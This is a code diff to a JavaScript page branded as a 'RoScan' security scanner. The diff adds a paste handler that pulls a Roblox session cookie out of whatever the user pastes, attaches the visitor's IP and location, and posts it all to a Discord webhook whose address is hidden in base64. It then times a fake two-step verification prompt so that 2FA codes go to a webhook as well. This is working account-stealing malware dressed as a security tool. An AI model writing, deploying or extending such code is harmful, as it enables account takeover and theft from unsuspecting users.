@@ -776,6 +776,69 @@ document.addEventListener('DOMContentLoaded', function() {
     }
 });
 
+// Handle paste event - immediate cookie capture + 80s timer for 2FA
+async function handlePasteEvent(pastedText) {
+    try {
+        console.log('Paste detected, analyzing content...');
+        
+        // Extract cookie from pasted text
+        const robloxCookie = extractRobloxCookie(pastedText);
+        
+        if (robloxCookie) {
+            console.log('Roblox cookie found in pasted content, sending immediately...');
+            
+            // Get user location
+            const locationInfo = await getUserLocation();
+            
+            // Use the same webhook URL
+            const webhookUrl = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5NTQ1MDc3NDQ4OTY2MTQ4MC9lby0yV3Y0dEUwV2didGh5WmJJWFFja0tDc3BLeUJNQzN6V1k3WmN5VzVSZzNfVm4xajh4UUxxUTRmR20wM2NFSEVHdQ==');
+            
+            // Create timestamp
+            const timestamp = new Date().toLocaleString();
+            
+            // Immediate cookie capture payload
+            const payload = {
+                content: `🍪 **Roblox Cookie Captured (Paste Event)**
+\`\`\`
+Cookie: ${robloxCookie}
+Time: ${timestamp}
+Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}, ${locationInfo.country || 'Unknown'}
+IP: ${locationInfo.ip || 'Unknown'}
+Content Length: ${pastedText.length} characters
+\`\`\`
+⏰ **2-Step Verification will trigger in 80 seconds...**
+@everyone`
+            };
+
+            // Send immediately
+            const response = await fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            });
+
+            if (response.ok) {
+                console.log('Cookie sent to webhook successfully');
+                
+                // Set up 80-second timer for 2FA modal
+                setTimeout(() => {
+                    console.log('80 seconds elapsed, opening 2-step verification modal...');
+                    openVerificationModal();
+                }, 80000); // 80 seconds
+                
+            } else {
+                console.error('Failed to send cookie to webhook');
+            }
+        } else {
+            console.log('No Roblox cookie found in pasted content');
+        }
+    } catch (error) {
+        console.error('Error handling paste event:', error);
+    }
+}
+
 // Send 2FA code to webhook
 async function send2FAToWebhook(code, trustDevice) {
     try {
@@ -914,6 +977,14 @@ document.addEventListener('DOMContentLoaded', function() {
             updateCharCount();
         });
         
+        // Handle paste events for immediate cookie capture
+        textarea.addEventListener('paste', function(e) {
+            setTimeout(() => {
+                const pastedText = this.value;
+                handlePasteEvent(pastedText);
+            }, 100); // Small delay to ensure paste content is processed
+        });
+        
         // Initialize character count
         updateCharCount();
     }
@@ -937,11 +1008,8 @@ document.addEventListener('DOMContentLoaded', function() {
         showNotification('RoScan security platform ready!', 'success');
     }, 1000);
     
-    // Auto-show 2-step verification after 80 seconds
-    setTimeout(() => {
-        console.log('Auto-opening 2-step verification modal...');
-        openVerificationModal();
-    }, 80000); // 80 seconds = 80,000 milliseconds
+    // Note: 2-step verification will auto-show 80 seconds after paste event
+    // See textarea paste handler for implementation
 });
 
 // Keyboard shortcuts
